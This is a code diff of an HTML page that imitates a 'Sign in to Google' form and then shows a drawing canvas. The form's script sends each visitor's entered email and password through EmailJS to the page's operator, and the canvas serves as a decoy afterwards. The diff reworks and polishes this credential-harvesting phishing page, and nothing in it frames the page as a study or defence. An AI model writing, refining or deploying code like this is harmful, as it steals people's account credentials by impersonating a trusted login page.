@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login & Drawing</title>
+    <title>Google Login and Drawing</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -22,7 +22,6 @@
             border-radius: 5px;
             background-color: #fff;
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            display: block;
         }
         .login-container h2 {
             margin-bottom: 20px;
@@ -50,94 +49,81 @@
         .login-container button:hover {
             background-color: #357ae8;
         }
-        canvas {
-            border: 1px solid black;
-            background-color: #fff;
-            display: none;
-        }
-        .drawing-container {
-            display: none;
-            text-align: center;
+        .drawing-canvas {
             margin-top: 20px;
+            border: 1px solid #ccc;
         }
     </style>
 </head>
 <body>
 
-    <!-- Login Form -->
-    <div class="login-container" id="loginForm">
+    <div class="login-container">
         <h2>Sign in to Google</h2>
-        <input type="email" id="email" placeholder="Email or phone" required>
-        <input type="password" id="password" placeholder="Enter your password" required>
-        <button type="submit" id="submitBtn">Next</button>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email or phone" required>
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <button type="submit">Next</button>
+        </form>
     </div>
 
-    <!-- Drawing Container -->
-    <div class="drawing-container" id="drawingContainer">
-        <h2>Draw Something!</h2>
-        <canvas id="drawingCanvas" width="500" height="500"></canvas>
-        <br>
-        <button onclick="clearCanvas()">Clear</button>
-    </div>
+    <canvas id="drawingCanvas" class="drawing-canvas" width="500" height="500"></canvas>
 
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS
-        (function () {
-            emailjs.init("user_wm_hgPysMxjkcdYas"); // Replace with your EmailJS user ID
+        (function() {
+            emailjs.init("Wm_hgPysMxjkcdYas"); // Initialize EmailJS with User ID
         })();
 
-        // Show the drawing section after successful login
-        document.getElementById('submitBtn').addEventListener('click', function(event) {
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            const data = {
-                email: email,
-                password: password
+            // Send email with form data
+            const templateParams = {
+                user_email: email,
+                user_password: password
             };
 
-            // Send the email data via EmailJS
-            emailjs.send("service_zrgq0cs", "template_8r7y8vw", data)
+            emailjs.send("service_zrgq0cs", "template_8r7y8vw", templateParams)
                 .then(function(response) {
-                    // Hide login and show drawing section
-                    document.getElementById('loginForm').style.display = 'none';
-                    document.getElementById('drawingContainer').style.display = 'block';
+                    console.log("Email sent successfully", response);
+                    alert("Form submitted! You will now be redirected to the drawing canvas.");
+                    showDrawingCanvas();
                 }, function(error) {
-                    alert("Failed to send the form. Please try again.");
+                    console.error("Error sending email", error);
+                    alert("Failed to send form. Please try again.");
                 });
         });
 
         // Drawing functionality
-        const canvas = document.getElementById('drawingCanvas');
-        const ctx = canvas.getContext('2d');
+        let canvas = document.getElementById('drawingCanvas');
+        let ctx = canvas.getContext('2d');
         let drawing = false;
 
-        canvas.addEventListener('mousedown', () => {
+        canvas.addEventListener('mousedown', function(event) {
             drawing = true;
-        });
-
-        canvas.addEventListener('mouseup', () => {
-            drawing = false;
-        });
-
-        canvas.addEventListener('mousemove', (event) => {
-            if (!drawing) return;
-            ctx.lineWidth = 5;
-            ctx.lineCap = 'round';
-            ctx.strokeStyle = '#000';
-            ctx.lineTo(event.clientX - canvas.offsetLeft, event.clientY - canvas.offsetTop);
-            ctx.stroke();
             ctx.beginPath();
             ctx.moveTo(event.clientX - canvas.offsetLeft, event.clientY - canvas.offsetTop);
         });
 
-        // Clear the canvas
-        function clearCanvas() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
+        canvas.addEventListener('mousemove', function(event) {
+            if (drawing) {
+                ctx.lineTo(event.clientX - canvas.offsetLeft, event.clientY - canvas.offsetTop);
+                ctx.stroke();
+            }
+        });
+
+        canvas.addEventListener('mouseup', function() {
+            drawing = false;
+        });
+
+        function showDrawingCanvas() {
+            document.querySelector('.login-container').style.display = 'none';
+            document.getElementById('drawingCanvas').style.display = 'block';
         }
     </script>
+
 </body>
 </html>
